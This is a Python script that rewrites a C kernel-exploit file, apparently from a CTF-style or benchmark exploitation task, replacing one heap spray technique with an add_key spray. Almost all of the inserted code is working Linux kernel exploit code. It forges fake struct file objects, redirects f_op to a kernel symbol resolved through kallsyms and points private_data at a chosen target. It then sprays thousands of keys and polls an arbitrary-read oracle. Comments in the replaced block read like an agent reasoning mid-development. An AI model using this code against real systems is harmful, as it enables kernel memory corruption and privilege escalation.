import re

with open("tier2/scripts/test_m7_spray.c", "r") as f:
    text = f.read()

# Replace the mmap spray with add_key spray
old_spray = """    int P_ROUNDS = 50;
    int PAGES_PER = 100; // Total 5000 pages
    int hit = 0;
    
    char payload[4096 - 24];
    memset(payload, 0, sizeof(payload));
    
    // Write fake struct file at every 256 bytes
    // Since data starts at offset 24 in user_key_payload, we must subtract 24!
    for (size_t file_off = 0; file_off < 4096; file_off += 256) {
        if (file_off < 24) continue; // Can't control offset 0 because of header!
        
        uint64_t base = (uint64_t)(payload + file_off - 24);
        
        // M4 layout + M5 poll dispatch
        *(uint64_t *)(base + 32) = comm_addr - 0x40; // f_inode
        
        // fake fops points to itself. But wait! The actual memory address of this file object
        // in kernel is unknown. However, we know it's page aligned!
        // Wait, we DO NOT know the page address!
        // Oh no! If we don't know the page address, how can we point f_op to itself?!
        // Wait... f_op doesn't HAVE to point to itself! It can point to empty_zero_page!
        // BUT we need f_op->poll to be swaps_poll!
        // empty_zero_page + 72 MUST be swaps_poll! But empty_zero_page is read-only zero!
        
        // Let me pause..."""

new_spray = """    int P_ROUNDS = 10;
    int PAGES_PER = 400; // Total 4000 pages
    int hit = 0;
    
    uint64_t swaps_proc_ops_addr = get_kallsyms_address("swaps_proc_ops");
    if (!swaps_proc_ops_addr) {
        printf("[-] Failed to find swaps_proc_ops\\n");
        return 1;
    }
    
    char payload[4096 - 24];
    memset(payload, 0, sizeof(payload));
    
    // Write fake struct file at every 256 bytes
    // Since data starts at offset 24 in user_key_payload, we must subtract 24!
    for (size_t file_off = 0; file_off < 4096; file_off += 256) {
        if (file_off < 24) continue; // Skip offset 0
        
        uint64_t base = (uint64_t)(payload + file_off - 24);
        
        *(uint64_t *)(base + 32) = comm_addr - 0x40; // f_inode
        *(uint64_t *)(base + 40) = swaps_proc_ops_addr - 0x10; // f_op -> swaps_poll at +0x48
        *(uint32_t *)(base + 48) = 0;    // f_lock
        *(uint64_t *)(base + 56) = 1;    // f_count
        *(uint32_t *)(base + 68) = 0x20000; // f_mode (FMODE_CAN_READ)
        *(uint64_t *)(base + 208) = empty_zero_page; // f_ep (cleanup safe)
        *(uint64_t *)(base + 184) = 0;   // f_version
        
        // private_data (target address - 0x60)
        *(uint64_t *)(base + 200) = dbg_counter_addr - 0x60;
    }
    
    char desc[32];
    for (int r = 0; r < P_ROUNDS; r++) {
        for (int i = 0; i < PAGES_PER; i++) {
            snprintf(desc, sizeof(desc), "key_%d_%d", r, i);
            long ret = syscall(__NR_add_key, "user", desc, payload, sizeof(payload), KEY_SPEC_PROCESS_KEYRING);
            if (ret < 0) {
                printf("[-] add_key failed round %d iter %d\\n", r, i);
                break;
            }
        }
        
        lseek(fdinfo_fd, 0, SEEK_SET);
        uint64_t f_ino = aar_read(fdinfo_fd);
        if (f_ino == 0x2f72657070617773) {
            printf("[+] Oracle Hit! 'swapper/' found in round %d (slabs=%d)\\n", r, read_slabs());
            hit = 1;
            break;
        }
    }
"""

text = text.replace(old_spray, new_spray)

# Also replace the '*(uint64_t *)(base + 72) = swaps_poll_addr;' line!
text = re.sub(r'// fops->poll\n\s*\*\s*\(uint64_t \*\)\(base \+ 72\)\s*=\s*swaps_poll_addr;\n', '', text)

with open("tier2/scripts/test_m7_spray.c", "w") as f:
    f.write(text)
